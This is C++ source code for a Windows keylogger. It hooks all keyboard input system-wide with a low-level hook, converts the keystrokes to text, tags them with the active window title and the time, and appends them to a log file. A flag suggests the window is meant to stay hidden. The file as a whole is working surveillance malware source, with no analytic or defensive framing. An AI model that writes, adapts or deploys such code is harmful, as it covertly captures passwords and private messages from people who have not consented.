#include "keylog.h"

constexpr bool VISIBLE = false;
constexpr int MAX_BUF = 256; 
HHOOK _hook;
KBDLLHOOKSTRUCT kb_data;
ofstream out_file;

using namespace std;

LRESULT __stdcall kb_callback(int kb_code, WPARAM w_param, LPARAM l_param) {
    if (kb_code >= 0) {
        if (w_param == WM_KEYDOWN) {
            kb_data = *((KBDLLHOOKSTRUCT*)l_param);
            save_keystroke(kb_data.vkCode);
        }
    }
    return CallNextHookEx(_hook, kb_code, w_param, l_param);
}

string resolve_keystroke(int kb_code, HKL keyboard_layout) {
    stringstream out_text;

    // first we account for special keypresses with a series of if-else statements
    if (kb_code == VK_BACK)
        out_text << "[BACKSPACE]";
    else if (kb_code == VK_RETURN)
        out_text << "[ENTER]";
    else if (kb_code == VK_SPACE)
        out_text << " ";
    else if (kb_code == VK_TAB)
        out_text << "[TAB]";
    else if ((kb_code == VK_SHIFT) || (kb_code == VK_LSHIFT) || (kb_code == VK_RSHIFT))
        out_text << "[SHIFT]";
    else if ((kb_code == VK_CONTROL) || (kb_code == VK_LCONTROL) || (kb_code == VK_RCONTROL))
        out_text << "[CTRL]";
    else if (kb_code == VK_MENU)
        out_text << "[ALT]";
    else if ((kb_code == VK_LWIN) || (kb_code == VK_RWIN))
        out_text << "[WINKEY]";
    else if (kb_code == VK_ESCAPE)
        out_text << "[ESC]";
    else if (kb_code == VK_END)
        out_text << "[END]";
    else if (kb_code == VK_HOME)
        out_text << "[HOME]";
    else if (kb_code == VK_LEFT)
        out_text << "[LEFT]";
    else if (kb_code == VK_RIGHT)
        out_text << "[RIGHT]";
    else if (kb_code == VK_UP)
        out_text << "[UP]";
    else if (kb_code == VK_DOWN)
        out_text << "[DOWN]";
    else if (kb_code == VK_PRIOR)
        out_text << "[PGUP]";
    else if (kb_code == VK_NEXT)
        out_text << "[PGDN]";
    else if ((kb_code == VK_OEM_PERIOD) || (kb_code == VK_DECIMAL))
        out_text << ".";
    else if ((kb_code == VK_OEM_MINUS) || (kb_code == VK_SUBTRACT))
        out_text << "-";
    else if (kb_code == VK_CAPITAL)
        out_text << "[CAPSLOCK]";
    // then we resolve normal keypresses using the MapVirtualKeyEx function
    else {
        char key;
        bool is_lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0); // check if caps locked
        if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
            is_lowercase = !is_lowercase;
        
        key = MapVirtualKeyExA(kb_code, MAPVK_VK_TO_CHAR, keyboard_layout);

        if (!is_lowercase)
            key = tolower(key);
        out_text << char(key);
    }

    return out_text.str();
}

int save_keystroke(int kb_code) {
    stringstream output; // holds output to write to buffer
    static char last_window[MAX_BUF] = "";

    if ((kb_code == 1) || (kb_code == 2)) { // mouse clicks
        return 1;
    }

    HWND top_window = GetForegroundWindow();
    DWORD thread_id;
    HKL keyboard_layout = NULL;

    if (top_window) {
        // get necessary variables to load keypresses
        thread_id = GetWindowThreadProcessId(top_window, NULL);
        keyboard_layout = GetKeyboardLayout(thread_id);

        // check if window at top of screen is the same as previously
        char current_window[MAX_BUF] = "";
        GetWindowTextA(top_window, (LPSTR)current_window, MAX_BUF);

        if (strcmp(last_window, current_window) != 0) { 
            strcpy_s(last_window, sizeof(last_window), current_window);

            time_t curr_time = time(NULL);
            struct tm time_container;
            localtime_s(&time_container, &curr_time);

            char time_text[MAX_BUF];
            strftime(time_text, sizeof(time_text), "%c", &time_container);

            output << endl << endl << "[Window: " << current_window << " - " << time_text << "] ";
        }
    }

    output << resolve_keystroke(kb_code, keyboard_layout);
    out_file << output.str();
    out_file.flush();

    cout << output.str();

    return 0; 
}

int main() {
    const char* filename = "keys.log";
    out_file.open(filename, ios_base::app);

    if (!(_hook = SetWindowsHookExA(WH_KEYBOARD_LL, kb_callback, NULL, 0))) {
        cerr << "Setting hook failed!" << endl;
        return 1;
    }

    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0));
}